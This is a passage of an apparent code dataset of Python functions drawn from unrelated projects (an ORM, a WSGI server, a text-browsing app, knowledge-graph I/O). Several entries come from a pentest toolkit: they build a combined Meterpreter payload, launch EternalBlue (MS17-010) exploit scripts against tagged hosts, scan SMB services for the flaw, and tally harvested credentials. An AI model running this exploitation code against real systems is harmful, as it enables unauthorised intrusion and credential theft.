curs.rowcount > 0:\n                #result = curs.fetchall()\n                # Process the results into a dict and stuff it in a RawlResult\n                # object.  Then append that object to result\n                result_rows = curs.fetchall()\n                for row in result_rows:\n                    \n                    i = 0\n                    row_dict = {}\n                    for col in working_columns:\n                        try:\n                            #log.debug(\"row_dict[%s] = row[%s] which is %s\" % (col, i, row[i]))\n                            # For aliased columns, we need to get rid of the dot\n                            col = col.replace('.', '_')\n                            row_dict[col] = row[i]\n                        except IndexError: pass\n                        i += 1\n                    \n                    log.debug(\"Appending dict to result: %s\" % row_dict)\n                    \n                    rr = RawlResult(working_columns, row_dict)\n                    result.append(rr)\n            \n            curs.close()\n\n        return result"
        ],
        [
            "def process_columns(self, columns):\n        \"\"\" \n        Handle provided columns and if necessary, convert columns to a list for \n        internal strage.\n\n        :columns: A sequence of columns for the table. Can be list, comma\n            -delimited string, or IntEnum.\n        \"\"\"\n        if type(columns) == list:\n            self.columns = columns\n        elif type(columns) == str:\n            self.columns = [c.strip() for c in columns.split()]\n        elif type(columns) == IntEnum:\n            self.columns = [str(c) for c in columns]\n        else:\n            raise RawlException(\"Unknown format for columns\")"
        ],
        [
            "def query(self, sql_string, *args, **kwargs):\n        \"\"\" \n        Execute a DML query \n\n        :sql_string:    An SQL string template\n        :*args:         Arguments to be passed for query parameters.\n        :commit:        Whether or not to commit the transaction after the query\n        :returns:       Psycopg2 result\n        \"\"\"\n        commit = None\n        columns = None\n        if kwargs.get('commit') is not None:\n            commit = kwargs.pop('commit')\n        if kwargs.get('columns') is not None:\n            columns = kwargs.pop('columns')\n        query = self._assemble_simple(sql_string, *args, **kwargs)\n        return self._execute(query, commit=commit, working_columns=columns)"
        ],
        [
            "def select(self, sql_string, cols, *args, **kwargs):\n        \"\"\" \n        Execute a SELECT statement \n\n        :sql_string:    An SQL string template\n        :columns:       A list of columns to be returned by the query\n        :*args:         Arguments to be passed for query parameters.\n        :returns:       Psycopg2 result\n        \"\"\"\n        working_columns = None\n        if kwargs.get('columns') is not None:\n            working_columns = kwargs.pop('columns')\n        query = self._assemble_select(sql_string, cols, *args, *kwargs)\n        return self._execute(query, working_columns=working_columns)"
        ],
        [
            "def get(self, pk):\n        \"\"\" \n        Retreive a single record from the table.  Lots of reasons this might be\n        best implemented in the model\n\n        :pk:            The primary key ID for the record\n        :returns:       List of single result\n        \"\"\"\n\n        if type(pk) == str:\n            # Probably an int, give it a shot\n            try:\n                pk = int(pk)\n            except ValueError: pass\n\n        return self.select(\n            \"SELECT {0} FROM \" + self.table + \" WHERE \" + self.pk + \" = {1};\",\n            self.columns, pk)"
        ],
        [
            "def create_payload(self, x86_file, x64_file, payload_file):\n        \"\"\"\n            Creates the final payload based on the x86 and x64 meterpreters.\n        \"\"\"\n        sc_x86 = open(os.path.join(self.datadir, x86_file), 'rb').read()\n        sc_x64 = open(os.path.join(self.datadir, x64_file), 'rb').read()\n\n        fp = open(os.path.join(self.datadir, payload_file), 'wb')\n        fp.write(b'\\x31\\xc0\\x40\\x0f\\x84' + pack('<I', len(sc_x86)))\n        fp.write(sc_x86)\n        fp.write(sc_x64)\n        fp.close()"
        ],
        [
            "def combine_files(self, f1, f2, f3):\n        \"\"\"\n            Combines the files 1 and 2 into 3.\n        \"\"\"\n        with open(os.path.join(self.datadir, f3), 'wb') as new_file:\n            with open(os.path.join(self.datadir, f1), 'rb') as file_1:\n                new_file.write(file_1.read())\n            with open(os.path.join(self.datadir, f2), 'rb') as file_2:\n                new_file.write(file_2.read())"
        ],
        [
            "def detect_os(self, ip):\n        \"\"\"\n            Runs the checker.py scripts to detect the os.\n        \"\"\"\n        process = subprocess.run(['python2', os.path.join(self.datadir, 'MS17-010', 'checker.py'), str(ip)], stdout=subprocess.PIPE)\n        out = process.stdout.decode('utf-8').split('\\n')\n        system_os = ''\n        for line in out:\n            if line.startswith('Target OS:'):\n                system_os = line.replace('Target OS: ', '')\n                break\n        return system_os"
        ],
        [
            "def exploit(self):\n        \"\"\"\n            Starts the exploiting phase, you should run setup before running this function.\n            if auto is set, this function will fire the exploit to all systems. Otherwise a curses interface is shown.\n        \"\"\"\n        search = ServiceSearch()\n        host_search = HostSearch()\n        services = search.get_services(tags=['MS17-010'])\n        services = [service for service in services]\n        if len(services) == 0:\n            print_error(\"No services found that are vulnerable for MS17-010\")\n            return\n\n        if self.auto:\n            print_success(\"Found {} services vulnerable for MS17-010\".format(len(services)))\n            for service in services:\n                print_success(\"Exploiting \" + str(service.address))\n                host = host_search.id_to_object(str(service.address))\n                system_os = ''\n\n                if host.os:\n                    system_os = host.os\n                else:\n                    system_os = self.detect_os(str(service.address))\n                    host.os = system_os\n                    host.save()\n                text = self.exploit_single(str(service.address), system_os)\n                print_notification(text)\n        else:\n            service_list = []\n            for service in services:\n                host = host_search.id_to_object(str(service.address))\n                system_os = ''\n\n                if host.os:\n                    system_os = host.os\n                else:\n                    system_os = self.detect_os(str(service.address))\n                    host.os = system_os\n                    host.save()\n\n                service_list.append({'ip': service.address, 'os': system_os, 'string': \"{ip} ({os}) {hostname}\".format(ip=service.address, os=system_os, hostname=host.hostname)})\n            draw_interface(service_list, self.callback, \"Exploiting {ip} with OS: {os}\")"
        ],
        [
            "def exploit_single(self, ip, operating_system):\n        \"\"\"\n            Exploits a single ip, exploit is based on the given operating system.\n        \"\"\"\n        result = None\n        if \"Windows Server 2008\" in operating_system or \"Windows 7\" in operating_system:\n            result = subprocess.run(['python2', os.path.join(self.datadir, 'MS17-010', 'eternalblue_exploit7.py'), str(ip), os.path.join(self.datadir, 'final_combined.bin'), \"12\"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        elif \"Windows Server 2012\" in operating_system or \"Windows 10\" in operating_system or \"Windows 8.1\" in operating_system:\n            result = subprocess.run(['python2', os.path.join(self.datadir, 'MS17-010', 'eternalblue_exploit8.py'), str(ip), os.path.join(self.datadir, 'final_combined.bin'), \"12\"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        else:\n            return [\"System target could not be automatically identified\"]\n        return result.stdout.decode('utf-8').split('\\n')"
        ],
        [
            "def make_server(host, port, app=None,\n                server_class=AsyncWsgiServer,\n                handler_class=AsyncWsgiHandler,\n                ws_handler_class=None,\n                ws_path='/ws'):\n    \"\"\"Create server instance with an optional WebSocket handler\n\n    For pure WebSocket server ``app`` may be ``None`` but an attempt to access\n    any path other than ``ws_path`` will cause server error.\n    \n    :param host: hostname or IP\n    :type host: str\n    :param port: server port\n    :type port: int\n    :param app: WSGI application\n    :param server_class: WSGI server class, defaults to AsyncWsgiServer\n    :param handler_class: WSGI handler class, defaults to AsyncWsgiHandler\n    :param ws_handler_class: WebSocket hanlder class, defaults to ``None``\n    :param ws_path: WebSocket path on the server, defaults to '/ws'\n    :type ws_path: str, optional\n    :return: initialized server instance\n    \"\"\"\n    handler_class.ws_handler_class = ws_handler_class\n    handler_class.ws_path = ws_path\n    httpd = server_class((host, port), RequestHandlerClass=handler_class)\n    httpd.set_app(app)\n    return httpd"
        ],
        [
            "def poll_once(self, timeout=0.0):\n        \"\"\"\n        Poll active sockets once\n\n        This method can be used to allow aborting server polling loop\n        on some condition.\n\n        :param timeout: polling timeout\n        \"\"\"\n        if self._map:\n            self._poll_func(timeout, self._map)"
        ],
        [
            "def serve_forever(self, poll_interval=0.5):\n        \"\"\"\n        Start serving HTTP requests\n\n        This method blocks the current thread.\n\n        :param poll_interval: polling timeout\n        :return:\n        \"\"\"\n        logger.info('Starting server on {}:{}...'.format(\n            self.server_name, self.server_port)\n        )\n        while True:\n            try:\n                self.poll_once(poll_interval)\n            except (KeyboardInterrupt, SystemExit):\n                break\n        self.handle_close()\n        logger.info('Server stopped.')"
        ],
        [
            "def write_index_translation(translation_filename, entity_ids, relation_ids):\n    \"\"\"write triples into a translation file.\"\"\"\n    translation = triple_pb.Translation()\n    entities = []\n    for name, index in entity_ids.items():\n        translation.entities.add(element=name, index=index)\n    relations = []\n    for name, index in relation_ids.items():\n        translation.relations.add(element=name, index=index)\n    with open(translation_filename, \"wb\") as f:\n        f.write(translation.SerializeToString())"
        ],
        [
            "def write_triples(filename, triples, delimiter=DEFAULT_DELIMITER, triple_order=\"hrt\"):\n    \"\"\"write triples to file.\"\"\"\n    with open(filename, 'w') as f:\n        for t in triples:\n            line = t.serialize(delimiter, triple_order)\n            f.write(line + \"\\n\")"
        ],
        [
            "def read_translation(filename):\n    \"\"\"Returns protobuf mapcontainer. Read from translation file.\"\"\"\n    translation = triple_pb.Translation()\n    with open(filename, \"rb\") as f:\n        translation.ParseFromString(f.read())\n\n    def unwrap_translation_units(units):\n        for u in units: yield u.element, u.index\n\n    return (list(unwrap_translation_units(translation.entities)),\n        list(unwrap_translation_units(translation.relations)))"
        ],
        [
            "def read_openke_translation(filename, delimiter='\\t', entity_first=True):\n    \"\"\"Returns map with entity or relations from plain text.\"\"\"\n    result = {}\n    with open(filename, \"r\") as f:\n        _ = next(f) # pass the total entry number\n        for line in f:\n            line_slice = line.rstrip().split(delimiter)\n            if not entity_first:\n                line_slice = list(reversed(line_slice))\n            result[line_slice[0]] = line_slice[1]\n\n    return result"
        ],
        [
            "def overview():\n    \"\"\"\n        Prints an overview of the tags of the hosts.\n    \"\"\"\n    doc = Host()\n    search = doc.search()\n    search.aggs.bucket('tag_count', 'terms', field='tags', order={'_count': 'desc'}, size=100)\n    response = search.execute()\n    print_line(\"{0:<25} {1}\".format('Tag', 'Count'))\n    print_line(\"-\" * 30)\n    for entry in response.aggregations.tag_count.buckets:\n        print_line(\"{0:<25} {1}\".format(entry.key, entry.doc_count))"
        ],
        [
            "def main():\n    \"\"\"\n        Main credentials tool\n    \"\"\"\n    cred_search = CredentialSearch()\n    arg = argparse.ArgumentParser(parents=[cred_search.argparser], conflict_handler='resolve')\n    arg.add_argument('-c', '--count', help=\"Only show the number of results\", action=\"store_true\")\n    arguments = arg.parse_args()\n\n    if arguments.count:\n        print_line(\"Number of credentials: {}\".format(cred_search.argument_count()))\n    else:\n        response = cred_search.get_credentials()\n        for hit in response:\n            print_json(hit.to_dict(include_meta=True))"
        ],
        [
            "def overview():\n    \"\"\"\n        Provides an overview of the duplicate credentials.\n    \"\"\"\n    search = Credential.search()\n    search.aggs.bucket('password_count', 'terms', field='secret', order={'_count': 'desc'}, size=20)\\\n        .metric('username_count', 'cardinality', field='username') \\\n        .metric('host_count', 'cardinality', field='host_ip') \\\n        .metric('top_hits', 'top_hits', docvalue_fields=['username'], size=100)\n    response = search.execute()\n    print_line(\"{0:65} {1:5} {2:5} {3:5} {4}\".format(\"Secret\", \"Count\", \"Hosts\", \"Users\", \"Usernames\"))\n    print_line(\"-\"*100)\n    for entry in response.aggregations.password_count.buckets:\n        usernames = []\n        for creds in entry.top_hits:\n            usernames.append(creds.username[0])\n        usernames = list(set(usernames))\n        print_line(\"{0:65} {1:5} {2:5} {3:5} {4}\".format(entry.key, entry.doc_count, entry.host_count.value, entry.username_count.value, usernames))"
        ],
        [
            "def process(self, nemo):\n        \"\"\" Register nemo and parses annotations\n\n        .. note:: Process parses the annotation and extends informations about the target URNs by retrieving resource in range\n\n        :param nemo: Nemo\n        \"\"\"\n        self.__nemo__ = nemo\n        for annotation in self.__annotations__:\n            annotation.target.expanded = frozenset(\n                self.__getinnerreffs__(\n                    objectId=annotation.target.objectId,\n                    subreference=annotation.target.subreference\n                )\n            )"
        ],
        [
            "def pipe_worker(pipename, filename, object_type, query, format_string, unique=False):\n    \"\"\"\n        Starts the loop to provide the data from jackal.\n    \"\"\"\n    print_notification(\"[{}] Starting pipe\".format(pipename))\n    object_type = object_type()\n    try:\n        while True:\n            uniq = set()\n            # Remove the previous file if it exists\n            if os.path.exists(filename):\n                os.remove(filename)\n\n            # Create the named pipe\n            os.mkfifo(filename)\n            # This function will block until a process opens it\n            with open(filename, 'w') as pipe:\n                print_success(\"[{}] Providing data\".format(pipename))\n                # Search the database\n                objects = object_type.search(**query)\n                for obj in objects:\n                    data = fmt.format(format_string, **obj.to_dict())\n                    if unique:\n                        if not data in uniq:\n                            uniq.add(data)\n                            pipe.write(data + '\\n')\n                    else:\n                        pipe.write(data + '\\n')\n            os.unlink(filename)\n    except KeyboardInterrupt:\n        print_notification(\"[{}] Shutting down named pipe\".format(pipename))\n    except Exception as e:\n        print_error(\"[{}] Error: {}, stopping named pipe\".format(e, pipename))\n    finally:\n        os.remove(filename)"
        ],
        [
            "def create_query(section):\n    \"\"\"\n        Creates a search query based on the section of the config file.\n    \"\"\"\n    query = {}\n\n    if 'ports' in section:\n        query['ports'] = [section['ports']]\n    if 'up' in section:\n        query['up'] = bool(section['up'])\n    if 'search' in section:\n        query['search'] = [section['search']]\n    if 'tags' in section:\n        query['tags'] = [section['tags']]\n    if 'groups' in section:\n        query['groups'] = [section['groups']]\n\n    return query"
        ],
        [
            "def create_pipe_workers(configfile, directory):\n    \"\"\"\n        Creates the workers based on the given configfile to provide named pipes in the directory.\n    \"\"\"\n    type_map = {'service': ServiceSearch,\n                'host': HostSearch, 'range': RangeSearch,\n                'user': UserSearch}\n    config = configparser.ConfigParser()\n    config.read(configfile)\n\n    if not len(config.sections()):\n        print_error(\"No named pipes configured\")\n        return\n\n    print_notification(\"Starting {} pipes in directory {}\".format(\n        len(config.sections()), directory))\n\n    workers = []\n    for name in config.sections():\n        section = config[name]\n        query = create_query(section)\n        object_type = type_map[section['type']]\n        args = (name, os.path.join(directory, name), object_type, query,\n                section['format'], bool(section.get('unique', 0)))\n        workers.append(multiprocessing.Process(target=pipe_worker, args=args))\n\n    return workers"
        ],
        [
            "def main():\n    \"\"\"\n        Loads the config and handles the workers.\n    \"\"\"\n    config = Config()\n    pipes_dir = config.get('pipes', 'directory')\n    pipes_config = config.get('pipes', 'config_file')\n    pipes_config_path = os.path.join(config.config_dir, pipes_config)\n    if not os.path.exists(pipes_config_path):\n        print_error(\"Please configure the named pipes first\")\n        return\n\n    workers = create_pipe_workers(pipes_config_path, pipes_dir)\n    if workers:\n        for worker in workers:\n            worker.start()\n\n        try:\n            for worker in workers:\n                worker.join()\n        except KeyboardInterrupt:\n            print_notification(\"Shutting down\")\n            for worker in workers:\n                worker.terminate()\n                worker.join()"
        ],
        [
            "def f_i18n_iso(isocode, lang=\"eng\"):\n    \"\"\" Replace isocode by its language equivalent\n\n    :param isocode: Three character long language code\n    :param lang: Lang in which to return the language name\n    :return: Full Text Language Name\n    \"\"\"\n    if lang not in flask_nemo._data.AVAILABLE_TRANSLATIONS:\n        lang = \"eng\"\n\n    try:\n        return flask_nemo._data.ISOCODES[isocode][lang]\n    except KeyError:\n        return \"Unknown\""
        ],
        [
            "def f_hierarchical_passages(reffs, citation):\n    \"\"\" A function to construct a hierarchical dictionary representing the different citation layers of a text\n\n    :param reffs: passage references with human-readable equivalent\n    :type reffs: [(str, str)]\n    :param citation: Main Citation\n    :type citation: Citation\n    :return: nested dictionary representing where keys represent the names of the levels and the final values represent the passage reference\n    :rtype: OrderedDict\n    \"\"\"\n    d = OrderedDict()\n    levels = [x for x in citation]\n    for cit, name in reffs:\n        ref = cit.split('-')[0]\n        levs = ['%{}|{}%'.format(levels[i].name, v) for i, v in enumerate(ref.split('.'))]\n        getFromDict(d, levs[:-1])[name] = cit\n    return d"
        ],
        [
            "def f_i18n_citation_type(string, lang=\"eng\"):\n    \"\"\" Take a string of form %citation_type|passage% and format it for human\n\n    :param string: String of formation %citation_type|passage%\n    :param lang: Language to translate to\n    :return: Human Readable string\n\n    .. note :: To Do : Use i18n tools and provide real i18n\n    \"\"\"\n    s = \" \".join(string.strip(\"%\").split(\"|\"))\n    return s.capitalize()"
        ],
        [
            "def f_annotation_filter(annotations, type_uri, number):\n    \"\"\" Annotation filtering filter\n\n    :param annotations: List of annotations\n    :type annotations: [AnnotationResource]\n    :param type_uri: URI Type on which to filter\n    :type type_uri: str\n    :param number: Number of the annotation to return\n    :type number: int\n    :return: Annotation(s) matching the request\n    :rtype: [AnnotationResource] or AnnotationResource\n    \"\"\"\n    filtered = [\n        annotation\n        for annotation in annotations\n        if annotation.type_uri == type_uri\n    ]\n    number = min([len(filtered), number])\n    if number == 0:\n        return None\n    else:\n        return filtered[number-1]"
        ],
        [
            "def check_service(service):\n    \"\"\"\n        Connect to a service to see if it is a http or https server.\n    \"\"\"\n    # Try HTTP\n    service.add_tag('header_scan')\n    http = False\n    try:\n        result = requests.head('http://{}:{}'.format(service.address, service.port), timeout=1)\n        print_success(\"Found http service on {}:{}\".format(service.address, service.port))\n        service.add_tag('http')\n        http = True\n        try:\n            service.banner = result.headers['Server']\n        except KeyError:\n            pass\n    except (ConnectionError, ConnectTimeout, ReadTimeout, Error):\n        pass\n\n    if not http:\n        # Try HTTPS\n        try:\n            result = requests.head('https://{}:{}'.format(service.address, service.port), verify=False, timeout=3)\n            service.add_tag('https')\n            print_success(\"Found https service on {}:{}\".format(service.address, service.port))\n            try:\n                service.banner = result.headers['Server']\n            except KeyError:\n                pass\n        except (ConnectionError, ConnectTimeout, ReadTimeout, Error):\n            pass\n    service.save()"
        ],
        [
            "def main():\n    \"\"\"\n        Retrieves services starts check_service in a gevent pool of 100.\n    \"\"\"\n    search = ServiceSearch()\n    services = search.get_services(up=True, tags=['!header_scan'])\n    print_notification(\"Scanning {} services\".format(len(services)))\n\n    # Disable the insecure request warning\n    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\n    pool = Pool(100)\n    count = 0\n    for service in services:\n        count += 1\n        if count % 50 == 0:\n            print_notification(\"Checking {}/{} services\".format(count, len(services)))\n        pool.spawn(check_service, service)\n\n    pool.join()\n    print_notification(\"Completed, 'http' tag added to services that respond to http, 'https' tag added to services that respond to https.\")"
        ],
        [
            "def import_nmap(result, tag, check_function=all_hosts, import_services=False):\n    \"\"\"\n        Imports the given nmap result.\n    \"\"\"\n    host_search = HostSearch(arguments=False)\n    service_search = ServiceSearch()\n    parser = NmapParser()\n    report = parser.parse_fromstring(result)\n    imported_hosts = 0\n    imported_services = 0\n    for nmap_host in report.hosts:\n        if check_function(nmap_host):\n            imported_hosts += 1\n            host = host_search.id_to_object(nmap_host.address)\n            host.status = nmap_host.status\n            host.add_tag(tag)\n            if nmap_host.os_fingerprinted:\n                host.os = nmap_host.os_fingerprint\n            if nmap_host.hostnames:\n                host.hostname.extend(nmap_host.hostnames)\n            if import_services:\n                for service in nmap_host.services:\n                    imported_services += 1\n                    serv = Service(**service.get_dict())\n                    serv.address = nmap_host.address\n                    service_id = service_search.object_to_id(serv)\n                    if service_id:\n                        # Existing object, save the banner and script results.\n                        serv_old = Service.get(service_id)\n                        if service.banner:\n                            serv_old.banner = service.banner\n                        # TODO implement\n                        # if service.script_results:\n                            # serv_old.script_results.extend(service.script_results)\n                        serv_old.save()\n                    else:\n                        # New object\n                        serv.address = nmap_host.address\n                        serv.save()\n                    if service.state == 'open':\n                        host.open_ports.append(service.port)\n                    if service.state == 'closed':\n                        host.closed_ports.append(service.port)\n                    if service.state == 'filtered':\n                        host.filtered_ports.append(service.port)\n            host.save()\n    if imported_hosts:\n        print_success(\"Imported {} hosts, with tag {}\".format(imported_hosts, tag))\n    else:\n        print_error(\"No hosts found\")\n    return {'hosts': imported_hosts, 'services': imported_services}"
        ],
        [
            "def nmap(nmap_args, ips):\n    \"\"\"\n        Start an nmap process with the given args on the given ips.\n    \"\"\"\n    config = Config()\n    arguments = ['nmap', '-Pn']\n    arguments.extend(ips)\n    arguments.extend(nmap_args)\n    output_file = ''\n    now = datetime.datetime.now()\n    if not '-oA' in nmap_args:\n        output_name = 'nmap_jackal_{}'.format(now.strftime(\"%Y-%m-%d %H:%M\"))\n        path_name = os.path.join(config.get('nmap', 'directory'), output_name)\n        print_notification(\"Writing output of nmap to {}\".format(path_name))\n        if not os.path.exists(config.get('nmap', 'directory')):\n            os.makedirs(config.get('nmap', 'directory'))\n        output_file = path_name + '.xml'\n        arguments.extend(['-oA', path_name])\n    else:\n        output_file = nmap_args[nmap_args.index('-oA') + 1] + '.xml'\n\n    print_notification(\"Starting nmap\")\n    subprocess.call(arguments)\n\n    with open(output_file, 'r') as f:\n        return f.read()"
        ],
        [
            "def nmap_scan():\n    \"\"\"\n        Scans the given hosts with nmap.\n    \"\"\"\n    # Create the search and config objects\n    hs = HostSearch()\n    config = Config()\n\n    # Static options to be able to figure out what options to use depending on the input the user gives.\n    nmap_types = ['top10', 'top100', 'custom', 'top1000', 'all']\n    options = {'top10':'--top-ports 10', 'top100':'--top-ports 100', 'custom': config.get('nmap', 'options'), 'top1000': '--top-ports 1000', 'all': '-p-'}\n\n    # Create an argument parser\n    hs_parser = hs.argparser\n    argparser = argparse.ArgumentParser(parents=[hs_parser], conflict_handler='resolve', \\\n    description=\"Scans hosts from the database using nmap, any arguments that are not in the help are passed to nmap\")\n    argparser.add_argument('type', metavar='type', \\\n        help='The number of ports to scan: top10, top100, custom, top1000 (default) or all', \\\n        type=str, choices=nmap_types, default='top1000', const='top1000', nargs='?')\n    arguments, extra_nmap_args = argparser.parse_known_args()\n\n    # Fix the tags for the search\n    tags = nmap_types[nmap_types.index(arguments.type):]\n    tags = [\"!nmap_\" + tag  for tag in tags]\n\n    hosts = hs.get_hosts(tags=tags)\n    hosts = [host for host in hosts]\n\n    # Create the nmap arguments\n    nmap_args = []\n    nmap_args.extend(extra_nmap_args)\n    nmap_args.extend(options[arguments.type].split(' '))\n\n    # Run nmap\n    print_notification(\"Running nmap with args: {} on {} hosts(s)\".format(nmap_args, len(hosts)))\n    if len(hosts):\n        result = nmap(nmap_args, [str(h.address) for h in hosts])\n        # Import the nmap result\n        for host in hosts:\n            host.add_tag(\"nmap_{}\".format(arguments.type))\n            host.save()\n        print_notification(\"Nmap done, importing results\")\n        stats = import_nmap(result, \"nmap_{}\".format(arguments.type), check_function=all_hosts, import_services=True)\n        stats['scanned_hosts'] = len(hosts)\n        stats['type'] = arguments.type\n\n        Logger().log('nmap_scan', \"Performed nmap {} scan on {} hosts\".format(arguments.type, len(hosts)), stats)\n    else:\n        print_notification(\"No hosts found\")"
        ],
        [
            "def nmap_smb_vulnscan():\n    \"\"\"\n        Scans available smb services in the database for smb signing and ms17-010.\n    \"\"\"\n    service_search = ServiceSearch()\n    services = service_search.get_services(ports=['445'], tags=['!smb_vulnscan'], up=True)\n    services = [service for service in services]\n    service_dict = {}\n    for service in services:\n        service.add_tag('smb_vulnscan')\n        service_dict[str(service.address)] = service\n\n    nmap_args = \"-Pn -n --disable-arp-ping --script smb-security-mode.nse,smb-vuln-ms17-010.nse -p 445\".split(\" \")\n\n    if services:\n        result = nmap(nmap_args, [str(s.address) for s in services])\n        parser = NmapParser()\n        report = parser.parse_fromstring(result)\n        smb_signing = 0\n        ms17 = 0\n        for nmap_host in report.hosts:\n            for script_result in nmap_host.scripts_results:\n                script_result = script_result.get('elements', {})\n                service = service_dict[str(nmap_host.address)]\n                if script_result.get('message_signing', '') == 'disabled':\n                    print_success(\"({}) SMB Signing disabled\".format(nmap_host.address))\n                    service.add_tag('smb_signing_disabled')\n                    smb_signing += 1\n                if script_result.get('CVE-2017-0143', {}).get('state', '') == 'VULNERABLE':\n                    print_success(\"({}) Vulnerable for MS17-010\".format(nmap_host.address))\n                    service.add_tag('MS17-010')\n                    ms17 += 1\n                service.update(tags=service.tags)\n\n        print_notification(\"Completed, 'smb_signing_disabled' tag added to systems with smb signing disabled, 'MS17-010' tag added to systems that did not apply MS17-010.\")\n        stats = {'smb_signing': smb_signing, 'MS17_010': ms17, 'scanned_services': len(services)}\n\n        Logger().log('smb_vulnscan', 'Scanned {} smb services for vulnerabilities'.format(len(services)), stats)\n    else:\n        print_notification(\"No services found to scan.\")"
        ],
        [
            "def overview():\n    \"\"\"\n        Function to create an overview of the services.\n        Will print a list of ports found an the number of times the port was seen.\n    \"\"\"\n    search = Service.search()\n    search = search.filter(\"term\", state='open')\n    search.aggs.bucket('port_count', 'terms', field='port', order={'_count': 'desc'}, size=100) \\\n        .metric('unique_count', 'cardinality', field='address')\n    response = search.execute()\n    print_line(\"Port     Count\")\n    print_line(\"---------------\")\n    for entry in response.aggregations.port_count.buckets:\n        print_line(\"{0:<7}  {1}\".format(entry.key, entry.unique_count.value))"
        ],
        [
            "def _plugin_endpoint_rename(fn_name, instance):\n    \"\"\" Rename endpoint function name to avoid conflict when namespacing is set to true\n\n    :param fn_name: Name of the route function\n    :param instance: Instance bound to the function\n    :return: Name of the new namespaced function name\n    \"\"\"\n\n    if instance and instance.namespaced:\n        fn_name = \"r_{0}_{1}\".format(instance.name, fn_name[2:])\n    return fn_name"
        ],
        [
            "def get_locale(self):\n        \"\"\" Retrieve the best matching locale using request headers\n\n        .. note:: Probably one of the thing to enhance quickly.\n\n        :rtype: str\n        \"\"\"\n        best_match = request.accept_languages.best_match(['de', 'fr', 'en', 'la'])\n        if best_match is None:\n            if len(request.accept_languages) > 0:\n                best_match = request.accept_languages[0][0][:2]\n            else:\n                return self.__default_lang__\n        lang = self.__default_lang__\n        if best_match == \"de\":\n            lang = \"ger\"\n        elif best_match == \"fr\":\n            lang = \"fre\"\n        elif best_match == \"en\":\n            lang = \"eng\"\n        elif best_match == \"la\":\n            lang = \"lat\"\n        return lang"
        ],
        [
            "def transform(self, work, xml, objectId, subreference=None):\n        \"\"\" Transform input according to potentially registered XSLT\n\n        .. note:: Since 1.0.0, transform takes an objectId parameter which represent the passage which is called\n\n        .. note:: Due to XSLT not being able to be used twice, we rexsltise the xml at every call of xslt\n\n        .. warning:: Until a C libxslt error is fixed ( https://bugzilla.gnome.org/show_bug.cgi?id=620102 ), \\\n        it is not possible to use strip tags in the xslt given to this application\n\n        :param work: Work object containing metadata about the xml\n        :type work: MyCapytains.resources.inventory.Text\n        :param xml: XML to transform\n        :type xml: etree._Element\n        :param objectId: Object Identifier\n        :type objectId: str\n        :param subreference: Subreference\n        :type subreference: str\n        :return: String representation of transformed resource\n        :rtype: str\n        \"\"\"\n        # We check first that we don't have\n        if str(objectId) in self._transform:\n            func = self._transform[str(objectId)]\n        else:\n            func = self._transform[\"default\"]\n\n        # If we have a string, it means we get a XSL filepath\n        if isinstance(func, str):\n            with open(func) as f:\n                xslt = etree.XSLT(etree.parse(f))\n            return etree.tostring(\n                xslt(xml),\n                encoding=str, method=\"html\",\n                xml_declaration=None, pretty_print=False, with_tail=True, standalone=None\n            )\n\n        # If we have a function, it means we return the result of the function\n        elif isinstance(func, Callable):\n            return func(work, xml, objectId, subreference)\n        # If we have None, it means we just give back the xml\n        elif func is None:\n            return etree.tostring(xml, encoding=str)"
        ],
        [
            "def get_inventory(self):\n        \"\"\" Request the api endpoint to retrieve information about the inventory\n\n        :return: Main Collection\n        :rtype: Collection\n        \"\"\"\n        if self._inventory is not None:\n            return self._inventory\n\n        self._inventory = self.resolver.getMetadata()\n        return self._inventory"
        ],
        [
            "def get_reffs(self, objectId, subreference=None, collection=None, export_collection=False):\n        \"\"\" Retrieve and transform a list of references.\n\n        Returns the inventory collection object with its metadata and a callback function taking a level parameter \\\n        and returning a list of strings.\n\n        :param objectId: Collection Identifier\n        :type objectId: str\n        :param subreference: Subreference from which to retrieve children\n        :type subreference: str\n        :param collection: Collection object bearing metadata\n        :type collection: Collection\n        :param export_collection: Return collection metadata\n        :type export_collection: bool\n        :return: Returns either the list of references, or the text collection object with its references as tuple\n        :rtype: (Collection, [str]) or [str]\n        \"\"\"\n        if collection is not None:\n            text = collection\n        else:\n            text = self.get_collection(objectId)\n        reffs = self.chunk(\n            text,\n            lambda level: self.resolver.getReffs(objectId, level=level, subreference=subreference)\n        )\n        if export_collection is True:\n            return text, reffs\n        return reffs"
        ],
        [
            "def get_passage(self, objectId, subreference):\n        \"\"\" Retrieve the passage identified by the parameters\n\n        :param objectId: Collection Identifier\n        :type objectId: str\n        :param subreference: Subreference of the passage\n        :type subreference: str\n        :return: An object bearing metadata and its text\n        :rtype: InteractiveTextualNode\n        \"\"\"\n        passage = self.resolver.getTextualNode(\n            textId=objectId,\n            subreference=subreference,\n            metadata=True\n        )\n        return passage"
        ],
        [
            "def get_siblings(self, objectId, subreference, passage):\n        \"\"\" Get siblings of a browsed subreference\n\n        .. note:: Since 1.0.0c, there is no more prevnext dict. Nemo uses the list of original\\\n        chunked references to retrieve next and previous, or simply relies on the resolver to get siblings\\\n        when the subreference is not found in given original chunks.\n\n        :param objectId: Id of the object\n        :param subreference: Subreference of the object\n        :param passage: Current Passage\n        :return: Previous and next references\n        :rtype: (str, str)\n        \"\"\"\n        reffs = [reff for reff, _ in self.get_reffs(objectId)]\n        if subreference in reffs:\n            index = reffs.index(subreference)\n            # Not the first item and not the last one\n            if 0 < index < len(reffs) - 1:\n                return reffs[index-1], reffs[index+1]\n            elif index == 0 and index < len(reffs) - 1:\n                return None, reffs[1]\n            elif index > 0 and index == len(reffs) - 1:\n                return reffs[index-1], None\n            else:\n                return None, None\n        else:\n            return passage.siblingsId"
        ],
        [
            "def semantic(self, collection, parent=None):\n        \"\"\" Generates a SEO friendly string for given collection\n\n        :param collection: Collection object to generate string for\n        :param parent: Current collection parent\n        :return: SEO/URL Friendly string\n        \"\"\"\n        if parent is not None:\n            collections = parent.parents[::-1] + [parent, collection]\n        else:\n            collections = collection.parents[::-1] + [collection]\n\n        return filters.slugify(\"--\".join([item.get_label() for item in collections if item.get_label()]))"
        ],
        [
